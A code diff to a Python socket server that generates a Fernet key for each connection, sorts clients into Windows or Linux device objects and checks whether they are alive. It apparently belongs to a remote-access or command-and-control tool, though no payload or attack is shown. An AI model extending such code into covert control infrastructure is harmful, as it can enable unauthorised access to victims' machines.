@@ -8,6 +8,17 @@ class SOCKET():
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.stopped = False
         self.start()
+    def get_conn(self, id):
+        # Get a connection by id
+        try:
+            id = int(id) - 1
+            return self.connections[id]
+        except ValueError:
+            return Exception("Invalid ID")
+        except IndexError:
+            print(1)
+            print(self.connections)
+            raise Exception("Connection does not exist")
     def decrypt(self, data):
         # Decrypt the data
         return self.fernet.decrypt(data).decode()
@@ -22,12 +33,12 @@ class SOCKET():
             # Check if Server is stopped
             if self.stopped:
                 break
-            for conn in self.connections:
+            for Device in self.connections:
                 try:
-                    conn.conn.send(self.encrypt("alive:alive"))
+                    Device.alive()
                 except:
-                    self.connections.remove(conn)
-                    log(f"Connection from {conn.addr} has been lost.", alert="error")
+                    self.connections.remove(Device)
+                    log(f"Connection from {Device.addr} has been lost.", alert="error")
             time.sleep(10)
 
 
@@ -42,26 +53,24 @@ class SOCKET():
                 logging.error(e)
                 exit()
             else:
-                ph_print(f"New Connection established from {addr[0]}:{addr[1]}")
+                self.key = Fernet.generate_key()
+                self.fernet = Fernet(self.key)
+                ph_print(f"New Connection established from {addr[0]}")
                 logging.info(f"New Connection established from {addr}")
-                self.connections.append()
                 conn.send(self.key)
-                operating_system = self.decrypt(conn.recv(1024))
+                operating_system = self.decrypt(conn.recv(1024)).lower()
                 if operating_system == "windows":
-                    self.connections.append(Windows(conn, addr))
+                    self.connections.append(Windows(conn, addr[0], self.key))
                 elif operating_system == "linux":
-                    self.connections.append(Linux(conn, addr))
+                    self.connections.append(Linux(conn, addr[0], self.key))
                 else:
                     log(f"Unknown Operating System: {operating_system}", alert="error")
                     logging.error(f"Unknown Operating System: {operating_system}")
-                    self.connections.remove(conn)
                     conn.close()
                     continue
 
     def start(self):
         self.connections = []
-        self.key = Fernet.generate_key()
-        self.fernet = Fernet(self.key)
         ADDR = (self.address, self.port)
         try:
             self.server.bind(ADDR)
